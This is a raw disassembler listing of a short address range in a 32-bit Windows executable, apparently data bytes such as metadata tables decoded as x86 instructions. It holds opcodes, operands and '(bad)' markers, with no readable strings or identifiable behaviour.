  40699e:	df 18                	fistps (%eax)
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	eb 18                	jmp    0x4069c6
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 80 1c 5a    	add    %al,0x5a1c8008(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	f4                   	hlt
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	c7                   	(bad)
  4069d7:	14 64                	adc    $0x64,%al
  4069d9:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	fe                   	(bad)
  4069e5:	14 0e                	adc    $0xe,%al
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 3d 0c b1 02 5c    	add    %bh,0x5c02b10c
  4069f7:	00 8f 25 00 00 00    	add    %cl,0x25(%edi)
  4069fd:	00 96 00 3d 0c b8    	add    %dl,-0x47f3c300(%esi)
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 3d 0c be 02 5f    	add    %bh,0x5f02be0c
  406a13:	00 78 20             	add    %bh,0x20(%eax)
  406a16:	00 00                	add    %al,(%eax)
  406a18:	00 00                	add    %al,(%eax)
  406a1a:	86 18                	xchg   %bl,(%eax)
  406a1c:	fe                   	(bad)
  406a1d:	14 0e                	adc    $0xe,%al
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 3e                	add    %bh,(%esi)
  406a2b:	0f c5                	pextrw $0xc5,(bad),%eax
  406a2d:	02 61 00             	add    0x0(%ecx),%ah
  406a30:	04 56                	add    $0x56,%al
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 57 0c             	add    %dl,0xc(%edi)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 3c 1d d2 02 64 00 	add    %bh,0x6402d2(,%ebx,1)
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 d4                	add    %dl,%ah
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 25 06 e1 02 68    	add    %ah,0x6802e106
  406a67:	00 e6                	add    %ah,%dh
  406a69:	25 00 00 00 00       	and    $0x0,%eax
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 61 10             	add    %ah,0x10(%ecx)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 a1 13 f6 02 6e    	add    %ah,0x6e02f613(%ecx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	fe                   	(bad)
  406a9b:	14 0e                	adc    $0xe,%al
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 64 18 84          	add    %ah,-0x7c(%eax,%ebx,1)
  406aab:	01 70 00             	add    %esi,0x0(%eax)
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 5b 18             	add    %bl,0x18(%ebx)
  406ab8:	84 01                	test   %al,(%ecx)
  406aba:	71 00                	jno    0x406abc
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	c1 0a 00             	rorl   $0x0,(%edx)
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 c1                	add    %al,%cl
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 c1                	add    %al,%cl
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 c1                	add    %al,%cl
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 c1                	add    %al,%cl
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 c1                	add    %al,%cl
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 c1                	add    %al,%cl
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 c1                	add    %al,%cl
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 c1                	add    %al,%cl
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 c1                	add    %al,%cl
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b01:	00 4b 13             	add    %cl,0x13(%ebx)
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b09:	08 00                	or     %al,(%eax)
  406b0b:	00 03                	add    %al,(%ebx)
  406b0d:	00 a9 10 00 00 04    	add    %ch,0x4000010(%ecx)
  406b13:	00 1b                	add    %bl,(%ebx)
  406b15:	18 00                	sbb    %al,(%eax)
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 cb                	add    %cl,%bl
  406b1b:	12 00                	adc    (%eax),%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 12                	add    %dl,(%edx)
  406b21:	0d 00 00 01 00       	or     $0x10000,%eax
  406b26:	b8 0d 00 00 01       	mov    $0x100000d,%eax
  406b2b:	00 b8 0d 00 00 01    	add    %bh,0x100000d(%eax)
  406b31:	00 22                	add    %ah,(%edx)
  406b33:	0d 00 00 01 00       	or     $0x10000,%eax
  406b38:	cd 18                	int    $0x18
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	bf 04 00 00 02       	mov    $0x2000004,%edi
  406b43:	00 f6                	add    %dh,%dh
  406b45:	1b 00                	sbb    (%eax),%eax
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 5b 1b             	add    %bl,0x1b(%ebx)
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	2a 07                	sub    (%edi),%al
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	36 18 00             	sbb    %al,%ss:(%eax)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 19                	add    %bl,(%ecx)
  406b5d:	1b 00                	sbb    (%eax),%eax
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 f4                	add    %dh,%ah
  406b63:	16                   	push   %ss
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 4b 13             	add    %cl,0x13(%ebx)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	64 0b 00             	or     %fs:(%eax),%eax
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 a2 07 00 00 02    	add    %ah,0x2000007(%edx)
  406b8b:	00 c1                	add    %al,%cl
  406b8d:	0a 00                	or     (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 c1                	add    %al,%cl
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406b9d:	00 b3 02 00 00 01    	add    %dh,0x1000002(%ebx)
  406ba3:	00 1f                	add    %bl,(%edi)
  406ba5:	0e                   	push   %cs
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	3e 1c 00             	ds sbb $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 e3                	add    %ah,%bl
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406bbb:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406bc1:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406bc7:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406bdf:	00 ae 1b 00 00 01    	add    %ch,0x100001b(%esi)
  406be5:	00 b8 18 00 00 01    	add    %bh,0x1000018(%eax)
  406beb:	00 48 16             	add    %cl,0x16(%eax)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	c4 16                	les    (%esi),%edx
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	c4 16                	les    (%esi),%edx
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	fb                   	sti
  406bff:	1b 00                	sbb    (%eax),%eax
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 fb                	add    %bh,%bl
  406c05:	1b 00                	sbb    (%eax),%eax
  406c07:	00 01                	add    %al,(%ecx)
  406c09:	00 fb                	add    %bh,%bl
  406c0b:	1b 00                	sbb    (%eax),%eax
  406c0d:	00 01                	add    %al,(%ecx)
  406c0f:	00 fb                	add    %bh,%bl
  406c11:	1b 00                	sbb    (%eax),%eax
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 fb                	add    %bh,%bl
  406c17:	1b 00                	sbb    (%eax),%eax
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 b8 0d 00 00 01    	add    %bh,0x100000d(%eax)
  406c21:	00 a5 0d 00 00 02    	add    %ah,0x200000d(%ebp)
  406c27:	00 b0 0d 00 00 01    	add    %dh,0x100000d(%eax)
  406c2d:	00 c1                	add    %al,%cl
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 c1                	add    %al,%cl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 c1                	add    %al,%cl
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 24 1c             	add    %ah,(%esp,%ebx,1)
  406c42:	00 00                	add    %al,(%eax)
  406c44:	01 00                	add    %eax,(%eax)
  406c46:	c1 0a 00             	rorl   $0x0,(%edx)
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c51:	00 a2 07 00 00 01    	add    %ah,0x1000007(%edx)
  406c57:	00 b5 17 00 00 01    	add    %dh,0x1000017(%ebp)
  406c5d:	00 b5 17 00 00 01    	add    %dh,0x1000017(%ebp)
  406c63:	00 c1                	add    %al,%cl
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 c1                	add    %al,%cl
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 c1                	add    %al,%cl
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 fa                	add    %bh,%dl
  406c77:	1c 00                	sbb    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 c1                	add    %al,%cl
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 fa                	add    %bh,%dl
  406c83:	1c 00                	sbb    $0x0,%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 c1                	add    %al,%cl
  406c89:	0a 00                	or     (%eax),%al
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 21                	add    %ah,(%ecx)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	21 07                	and    %eax,(%edi)
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	64 0d 00 00 01 00    	fs or  $0x10000,%eax
  406ca0:	c1 0a 00             	rorl   $0x0,(%edx)
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 65 0e             	add    %ah,0xe(%ebp)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	6a 0e                	push   $0xe
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	6a 0e                	push   $0xe
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	c4 16                	les    (%esi),%edx
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	21 07                	and    %eax,(%edi)
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	b5 17                	mov    $0x17,%ch
  406cc6:	00 00                	add    %al,(%eax)
  406cc8:	01 00                	add    %eax,(%eax)
  406cca:	b5 17                	mov    $0x17,%ch
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	c1 0a 00             	rorl   $0x0,(%edx)
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 c1                	add    %al,%cl
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 c1                	add    %al,%cl
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 b5 17 00 00 02    	add    %dh,0x2000017(%ebp)
  406ce7:	00 8d 10 00 00 01    	add    %cl,0x1000010(%ebp)
  406ced:	00 b5 17 00 00 01    	add    %dh,0x1000017(%ebp)
  406cf3:	00 6e 0b             	add    %ch,0xb(%esi)
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	b5 17                	mov    $0x17,%ch
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	01 00                	add    %eax,(%eax)
  406d00:	b5 17                	mov    $0x17,%ch
  406d02:	00 00                	add    %al,(%eax)
  406d04:	01 00                	add    %eax,(%eax)
  406d06:	b5 17                	mov    $0x17,%ch
  406d08:	00 00                	add    %al,(%eax)
  406d0a:	02 00                	add    (%eax),%al
  406d0c:	74 0e                	je     0x406d1c
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	b5 17                	mov    $0x17,%ch
  406d14:	00 00                	add    %al,(%eax)
  406d16:	02 00                	add    (%eax),%al
  406d18:	bb 16 00 00 01       	mov    $0x1000016,%ebx
  406d1d:	00 b5 17 00 00 02    	add    %dh,0x2000017(%ebp)
  406d23:	00 6a 0e             	add    %ch,0xe(%edx)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	b5 17                	mov    $0x17,%ch
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	6a 0e                	push   $0xe
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	b5 17                	mov    $0x17,%ch
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	65 0e                	gs push %cs
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	b5 17                	mov    $0x17,%ch
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	6f                   	outsl  %ds:(%esi),(%dx)
  406d49:	0e                   	push   %cs
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	b5 17                	mov    $0x17,%ch
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	6f                   	outsl  %ds:(%esi),(%dx)
  406d55:	0e                   	push   %cs
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	ae                   	scas   %es:(%edi),%al
  406d5b:	1b 00                	sbb    (%eax),%eax
  406d5d:	00 01                	add    %al,(%ecx)
  406d5f:	00 ae 1b 16 00 59    	add    %ch,0x5900161b(%esi)
  406d65:	00 18                	add    %bl,(%eax)
  406d67:	00 5d 00             	add    %bl,0x0(%ebp)
  406d6a:	b1 00                	mov    $0x0,%cl
  406d6c:	e7 1a                	out    %eax,$0x1a
  406d6e:	bb 01 b1 00 d3       	mov    $0xd300b101,%ebx
  406d73:	1b bf 01 b1 00 c2    	sbb    -0x3dff4eff(%edi),%edi
  406d79:	19 0e                	sbb    %ecx,(%esi)
  406d7b:	00 b9 00 e6 14 64    	add    %bh,0x6414e600(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 fe                	add    %bh,%dh
  406d85:	14 01                	adc    $0x1,%al
  406d87:	03 d1                	add    %ecx,%edx
  406d89:	00 fe                	add    %bh,%dh
  406d8b:	14 0e                	adc    $0xe,%al
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 fe                	add    %bh,%dh
  406d91:	14 2e                	adc    $0x2e,%al
  406d93:	03 e9                	add    %ecx,%ebp
  406d95:	00 fe                	add    %bh,%dh
  406d97:	14 6b                	adc    $0x6b,%al
  406d99:	01 f1                	add    %esi,%ecx
  406d9b:	00 fe                	add    %bh,%dh
  406d9d:	14 6b                	adc    $0x6b,%al
  406d9f:	01 f9                	add    %edi,%ecx
  406da1:	00 fe                	add    %bh,%dh
  406da3:	14 6b                	adc    $0x6b,%al
  406da5:	01 01                	add    %eax,(%ecx)
  406da7:	01 fe                	add    %edi,%esi
  406da9:	14 6b                	adc    $0x6b,%al
  406dab:	01 09                	add    %ecx,(%ecx)
  406dad:	01 fe                	add    %edi,%esi
  406daf:	14 6b                	adc    $0x6b,%al
  406db1:	01 11                	add    %edx,(%ecx)
  406db3:	01 fe                	add    %edi,%esi
  406db5:	14 6b                	adc    $0x6b,%al
  406db7:	01 19                	add    %ebx,(%ecx)
  406db9:	01 fe                	add    %edi,%esi
  406dbb:	14 6b                	adc    $0x6b,%al
  406dbd:	01 21                	add    %esp,(%ecx)
  406dbf:	01 fe                	add    %edi,%esi
  406dc1:	14 6b                	adc    $0x6b,%al
  406dc3:	01 29                	add    %ebp,(%ecx)
  406dc5:	01 fe                	add    %edi,%esi
  406dc7:	14 6b                	adc    $0x6b,%al
  406dc9:	01 31                	add    %esi,(%ecx)
  406dcb:	01 fe                	add    %edi,%esi
  406dcd:	14 4b                	adc    $0x4b,%al
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 fe                	add    %edi,%esi
  406dd3:	14 0e                	adc    $0xe,%al
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	fe                   	(bad)
  406dd9:	14 6b                	adc    $0x6b,%al
  406ddb:	01 49 01             	add    %ecx,0x1(%ecx)
  406dde:	7d 12                	jge    0x406df2
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 6e 00             	add    %ebp,0x0(%esi)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 ec                	add    %ebp,%esp
  406deb:	19 7f 00             	sbb    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 6e 10             	add    %ebp,0x10(%esi)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	fe                   	(bad)
  406df7:	14 0e                	adc    $0xe,%al
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	37                   	aaa
  406dfd:	01 cd                	add    %ecx,%ebp
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	1d 0c 2a 01 61       	sbb    $0x61012a0c,%eax
  406e07:	01 ac 0c d3 03 11 00 	add    %ebp,0x1103d3(%esp,%ecx,1)
  406e0e:	fe                   	(bad)
  406e0f:	14 2b                	adc    $0x2b,%al
  406e11:	02 11                	add    (%ecx),%dl
  406e13:	00 cc                	add    %cl,%ah
  406e15:	1c d9                	sbb    $0xd9,%al
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	97                   	xchg   %eax,%edi
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	b2 16                	mov    $0x16,%dl
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 e2 01 c7 00    	addl   $0xc701e2,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	34 0d                	xor    $0xd,%al
  406e2e:	eb 03                	jmp    0x406e33
  406e30:	19 00                	sbb    %eax,(%eax)
  406e32:	fe                   	(bad)
  406e33:	14 09                	adc    $0x9,%al
  406e35:	04 19                	add    $0x19,%al
  406e37:	00 44 0b 01          	add    %al,0x1(%ebx,%ecx,1)
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 31                	add    %dh,(%ecx)
  406e3f:	0b 01                	or     (%ecx),%eax
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 71 1d             	add    %esi,0x1d(%ecx)
  406e46:	16                   	push   %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 de                	add    %ebx,%esi
  406e4b:	19 1c 04             	sbb    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	fe                   	(bad)
  406e51:	14 0e                	adc    $0xe,%al
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 d7                	add    %edx,%edi
  406e57:	1b 23                	sbb    (%ebx),%esp
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 ef                	add    %ebp,%edi
  406e5d:	15 28 04 19 00       	adc    $0x190428,%eax
  406e62:	45                   	inc    %ebp
  406e63:	19 30                	sbb    %esi,(%eax)
  406e65:	04 19                	add    $0x19,%al
  406e67:	00 34 03             	add    %dh,(%ebx,%eax,1)
  406e6a:	bf 01 19 00 45       	mov    $0x45001901,%edi
  406e6f:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 fe                	add    %edi,%esi
  406e75:	14 0e                	adc    $0xe,%al
  406e77:	00 a1 01 fe 14 36    	add    %ah,0x3614fe01(%ecx)
  406e7d:	02 99 01 5f 17 38    	add    0x38175f01(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 48 0c             	add    %ecx,0xc(%eax)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 de             	roll   $0xde,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 d7                	add    %edx,%edi
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 64 08 0e          	add    %esp,0xe(%eax,%ecx,1)
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 fe                	add    %edi,%esi
  406e9f:	14 4f                	adc    $0x4f,%al
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 fe                	add    %dh,%bh
  406ea5:	14 56                	adc    $0x56,%al
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 fe                	add    %bh,%dh
  406eab:	14 5c                	adc    $0x5c,%al
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 2b                	add    %ch,(%ebx)
  406eb1:	1b 66 04             	sbb    0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	63 0c 47             	arpl   %ecx,(%edi,%eax,2)
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 67 1a             	add    %ah,0x1a(%edi)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 fe                	add    %dh,%bh
  406ec3:	14 56                	adc    $0x56,%al
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 fe                	add    %bh,%dh
  406ec9:	14 78                	adc    $0x78,%al
  406ecb:	04 31                	add    $0x31,%al
  406ecd:	02 fe                	add    %dh,%bh
  406ecf:	14 56                	adc    $0x56,%al
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 07                	add    %al,(%edi)
  406ed5:	03 82 04 39 02 94    	add    -0x6bfdc6fc(%edx),%eax
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 6f 17             	add    %ch,0x17(%edi)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 ff                	add    %bh,%bh
  406ef9:	02 a1 04 49 02 6e    	add    0x6e024904(%ecx),%ah
  406eff:	00 a7 04 c1 00 0c    	add    %ah,0xc00c104(%edi)
  406f05:	03 ae 04 51 02 fe    	add    -0x1fdaefc(%esi),%ebp
  406f0b:	14 56                	adc    $0x56,%al
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 fe                	add    %edi,%esi
  406f11:	14 b6                	adc    $0xb6,%al
  406f13:	04 49                	add    $0x49,%al
  406f15:	01 90 1b bd 04 61    	add    %edx,0x6104bd1b(%eax)
  406f1b:	02 7f 14             	add    0x14(%edi),%bh
  406f1e:	cf                   	iret
  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 b2 16 9f 01 19    	add    0x19019f16(%edx),%dh
  406f27:	00 39                	add    %bh,(%ecx)
  406f29:	0f d6                	(bad)
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 e2                	add    %ah,%dl
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 fe                	add    %dh,%bh
  406f35:	14 2b                	adc    $0x2b,%al
  406f37:	02 c1                	add    %cl,%al
  406f39:	00 a5 11 15 02 c1    	add    %ah,-0x3efdeaef(%ebp)
  406f3f:	00 3f                	add    %bh,(%edi)
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	ec                   	in     (%dx),%al
  406f47:	19 9a 00 71 02 3d    	sbb    %ebx,0x3d027100(%edx)
  406f4d:	19 0a                	sbb    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	c7                   	(bad)
  406f53:	15 c7 00 a1 02       	adc    $0x2a100c7,%eax
  406f58:	dc 07                	faddl  (%edi)
  406f5a:	01 05 79 02 fe 14    	add    %eax,0x14fe0279
